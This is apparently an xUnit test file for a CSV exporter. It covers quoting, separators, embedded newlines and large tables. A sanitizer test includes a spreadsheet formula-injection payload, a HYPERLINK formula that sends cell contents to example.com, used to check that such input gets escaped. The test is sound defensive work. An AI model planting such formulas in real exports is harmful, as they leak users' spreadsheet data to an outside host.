using System;
using System.Data;
using System.IO;
using System.Text;
using Xunit;

namespace DelimitedDataParser
{
    public partial class ExporterTest
    {
        private const string CharPool = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
        private readonly Random _random = new Random();

        [Fact]
        public void Can_Load_Input()
        {
            var exporter = new Exporter();
            var output = exporter.ExportToString(CreateDataTable());

            Assert.NotNull(output);
        }

        [Fact]
        public void Can_Parse_Empty_Fields()
        {
            var input = CreateDataTable();
            AddColumn(input, string.Empty);
            AddColumn(input, string.Empty);

            AddRow(input, string.Empty, string.Empty);

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""Column1"",""Column2""" + Environment.NewLine
                + @""""",""""",
                output);
        }

        [Fact]
        public void Can_Parse_Empty_Table()
        {
            var exporter = new Exporter();

            var output = exporter.ExportToString(CreateDataTable());

            Assert.Equal(0, output.Length);
        }

        [Fact]
        public void Can_Parse_Multiple_Rows()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Three", "Four");
            AddRow(input, "Five", "Six");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""One"",""Two""" + Environment.NewLine
                + @"""Three"",""Four""" + Environment.NewLine
                + @"""Five"",""Six""",
                output);
        }

        [Fact]
        public void Can_Parse_Null_Fields()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, null, "Two");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""One"",""Two""" + Environment.NewLine
                + @""""",""Two""",
                output);
        }

        [Fact]
        public void Does_Not_Strip_Whitespace_From_Column_Names()
        {
            var input = CreateDataTable();
            AddColumn(input, " One");
            AddColumn(input, "Two ");
            AddColumn(input, " Three ");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@""" One"",""Two "","" Three """, output);
        }

        [Fact]
        public void Fails_Without_Valid_Input()
        {
            using (var writer = new StringWriter())
            {
                var exporter = new Exporter();
                Assert.Throws<ArgumentNullException>(() => exporter.Export(null, writer));
            }
        }

        [Fact]
        public void Outputs_Column_Names()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");
            AddColumn(input, "Three");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""Two"",""Three""", output);
        }

        [Fact]
        public void Supports_Changing_Field_Separator_Char_Colon()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Three", "Four");
            AddRow(input, "Five", "Six");

            var exporter = new Exporter();
            exporter.FieldSeparator = ':';
            var output = exporter.ExportToString(input);

            Assert.Equal(
                "\"One\":\"Two\"" + Environment.NewLine
                + "\"Three\":\"Four\"" + Environment.NewLine
                + "\"Five\":\"Six\"",
                output);
        }

        [Fact]
        public void Supports_Changing_Field_Separator_Char_Pipe()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Three", "Four");
            AddRow(input, "Five", "Six");

            var exporter = new Exporter();
            exporter.FieldSeparator = '|';
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""One""|""Two""" + Environment.NewLine
                + @"""Three""|""Four""" + Environment.NewLine
                + @"""Five""|""Six""",
                output);
        }

        [Fact]
        public void Supports_Changing_Field_Separator_Char_Space()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Three", "Four");
            AddRow(input, "Five", "Six");

            var exporter = new Exporter();
            exporter.FieldSeparator = ' ';
            var output = exporter.ExportToString(input);

            Assert.Equal(
                "\"One\" \"Two\"" + Environment.NewLine
                + "\"Three\" \"Four\"" + Environment.NewLine
                + "\"Five\" \"Six\"",
                output);
        }

        [Fact]
        public void Supports_Changing_Field_Separator_Char_Tab()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Three", "Four");
            AddRow(input, "Five", "Six");

            var exporter = new Exporter();
            exporter.FieldSeparator = '\t';
            var output = exporter.ExportToString(input);

            Assert.Equal(
                "\"One\"\t\"Two\"" + Environment.NewLine
                + "\"Three\"\t\"Four\"" + Environment.NewLine
                + "\"Five\"\t\"Six\"",
                output);
        }

        [Fact]
        public void Supports_Column_Name_Containing_Carriage_Return()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Tw\ro");
            AddColumn(input, "Three");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""Tw" + "\r" + @"o"",""Three""", output);
        }

        [Fact]
        public void Supports_Column_Name_Containing_Comma()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, @"Tw,o");
            AddColumn(input, "Three");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""Tw,o"",""Three""", output);
        }

        [Fact]
        public void Supports_Column_Name_Containing_Full_New_Line()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Tw" + Environment.NewLine + "o");
            AddColumn(input, "Three");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""Tw" + Environment.NewLine + @"o"",""Three""", output);
        }

        [Fact]
        public void Supports_Column_Name_Containing_Line_Feed()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Tw\no");
            AddColumn(input, "Three");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""Tw" + "\n" + @"o"",""Three""", output);
        }

        [Fact]
        public void Supports_Column_Name_Containing_Quote()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, @"Tw""o");
            AddColumn(input, "Three");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""Tw""""o"",""Three""", output);
        }

        [Fact]
        public void Supports_Column_Name_Containing_Reversed_New_Line()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Tw\n\ro");
            AddColumn(input, "Three");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""Tw" + "\n\r" + @"o"",""Three""", output);
        }

        [Fact]
        public void Supports_Data_Containing_Full_New_Line()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Thr" + Environment.NewLine + "ee", "Four");
            AddRow(input, "Five", "Six");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""One"",""Two""" + Environment.NewLine
                + @"""Thr" + Environment.NewLine + @"ee"",""Four""" + Environment.NewLine
                + @"""Five"",""Six""",
                output);
        }

        [Fact]
        public void Supports_Data_Containing_Quote()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, @"Thr""ee", "Four");
            AddRow(input, "Five", "Six");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""One"",""Two""" + Environment.NewLine
                + @"""Thr""""ee"",""Four""" + Environment.NewLine
                + @"""Five"",""Six""",
                output);
        }

        [Fact]
        public void Supports_Data_Ending_With_Quote()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Three", "Four");
            AddRow(input, "Five", @"Six""");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""One"",""Two""" + Environment.NewLine
                + @"""Three"",""Four""" + Environment.NewLine
                + @"""Five"",""Six""""""",
                output);
        }

        [Fact]
        public void Supports_Empty_Column_Name()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, string.Empty);
            AddColumn(input, "Three");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""Column1"",""Three""", output);
        }

        [Fact]
        public void Supports_Empty_Last_Column_Name()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");
            AddColumn(input, string.Empty);

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""Two"",""Column1""", output);
        }

        [Fact]
        public void Supports_Huge_Table()
        {
            int cols = 1000;
            int rows = 1000;

            StringBuilder expected = new StringBuilder();

            var input = CreateDataTable();
            for (int i = 0; i < cols; i++)
            {
                AddColumn(input, "Col" + i.ToString());

                if (i > 0)
                {
                    expected.Append(',');
                }

                expected.Append("\"Col" + i.ToString() + "\"");
            }

            string[] rowContent;
            for (int i = 0; i < rows; i++)
            {
                expected.Append(Environment.NewLine);

                rowContent = new string[cols];

                for (int j = 0; j < cols; j++)
                {
                    rowContent[j] = GetRandomString(10);

                    if (j > 0)
                    {
                        expected.Append(',');
                    }

                    expected.Append(string.Format("\"{0}\"", rowContent[j]));
                }

                AddRow(input, rowContent);
            }

            var exporter = new Exporter();

            var stopwatch = System.Diagnostics.Stopwatch.StartNew();

            var output = exporter.ExportToString(input);

            stopwatch.Stop();

            Assert.Equal(expected.ToString(), output);

            double duration = stopwatch.ElapsedMilliseconds;

            Assert.True(duration / 1000 < 1);
        }

        [Fact]
        public void Supports_Large_Cell_Content()
        {
            string cellContent = new string('a', 10000000);

            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Three", cellContent);

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""One"",""Two""" + Environment.NewLine
                + @"""Three"",""" + cellContent + @"""",
                output);
        }

        [Fact]
        public void Supports_Multiple_Blank_Rows()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Three", "Four");
            AddRow(input, string.Empty, string.Empty);
            AddRow(input, string.Empty, string.Empty);
            AddRow(input, "Five", "Six");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""One"",""Two""" + Environment.NewLine
                + @"""Three"",""Four""" + Environment.NewLine
                + @""""",""""" + Environment.NewLine
                + @""""",""""" + Environment.NewLine
                + @"""Five"",""Six""",
                output);
        }

        [Fact]
        public void Supports_Not_Outputting_Column_Names()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Three", "Four");
            AddRow(input, "Five", "Six");

            var exporter = new Exporter();
            exporter.OutputColumnHeaders = false;
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""Three"",""Four""" + Environment.NewLine
                + @"""Five"",""Six""",
                output);
        }

        [Fact]
        public void Supports_Null_Column_Name()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, null);
            AddColumn(input, "Three");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""Column1"",""Three""", output);
        }

        [Fact]
        public void Supports_Quoted_Column_Name()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, @"""Two""");
            AddColumn(input, "Three");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(@"""One"",""""""Two"""""",""Three""", output);
        }

        [Fact]
        public void Supports_Quoted_Data()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, @"""Three""", "Four");
            AddRow(input, "Five", "Six");

            var exporter = new Exporter();
            var output = exporter.ExportToString(input);

            Assert.Equal(
                @"""One"",""Two""" + Environment.NewLine
                + @"""""""Three"""""",""Four""" + Environment.NewLine
                + @"""Five"",""Six""",
                output);
        }

        [Fact]
        public void Exports_Unquoted_Data()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, "Three", "Four");
            AddRow(input, "Five", "Six");

            var exporter = new Exporter
            {
                IncludeEscapeCharacters = false
            };

            var output = exporter.ExportToString(input);

            Assert.Equal(
                "One,Two" + Environment.NewLine
                + "Three,Four" + Environment.NewLine
                + "Five,Six",
                output);
        }

        [Theory]
        [InlineData("=", "'=")]
        [InlineData("+", "'+")]
        [InlineData("-", "'-")]
        [InlineData("@", "'@")]
        [InlineData(@"=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")", @"'=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")")]
        public void Sanitizer_Escapes_Blacklisted_Characters(string inputString, string expectedOutput)
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, inputString, inputString);

            var exporter = new Exporter
            {
                IncludeEscapeCharacters = false,
                SanitizeStrings = true
            };

            var output = exporter.ExportToString(input);

            Assert.Equal(
                "One,Two" + Environment.NewLine
                + string.Concat(expectedOutput + ",", expectedOutput),
                output);
        }

        [Theory]
        [InlineData("abcdef")]
        [InlineData("abc + def - ghi @ jkl")]
        [InlineData(" =")]
        [InlineData(" +")]
        [InlineData(" -")]
        [InlineData(" @")]
        public void Sanitizer_Does_Not_Escape_Safe_Input(string inputString)
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, inputString, inputString);

            var exporter = new Exporter
            {
                IncludeEscapeCharacters = false,
                SanitizeStrings = true
            };

            var output = exporter.ExportToString(input);

            Assert.Equal(
                "One,Two" + Environment.NewLine
                + string.Concat(inputString + ",", inputString),
                output);
        }

        [Fact]
        public void Sanitizer_Ignores_Null_Values()
        {
            var input = CreateDataTable();
            AddColumn(input, "One");
            AddColumn(input, "Two");

            AddRow(input, null, null);

            var exporter = new Exporter
            {
                IncludeEscapeCharacters = false,
                SanitizeStrings = true
            };

            var output = exporter.ExportToString(input);

            Assert.Equal(
                "One,Two" + Environment.NewLine
                + ",",
                output);
        }

        private static void AddColumn(DataTable table, string columnName)
        {
            table.Columns.Add(columnName);
        }

        private static void AddRow(DataTable table, params string[] values)
        {
            if (values.Length != table.Columns.Count)
            {
                throw new ArgumentOutOfRangeException();
            }

            var row = table.NewRow();

            for (int i = 0; i < values.Length; i++)
            {
                row[i] = values[i];
            }

            table.Rows.Add(row);
        }

        private static DataTable CreateDataTable()
        {
            return new DataTable();
        }

        private string GetRandomString(int length)
        {
            var rs = new StringBuilder();

            while (length-- > 0)
            {
                rs.Append(CharPool[(int)(_random.NextDouble() * CharPool.Length)]);
            }

            return rs.ToString();
        }
    }
}
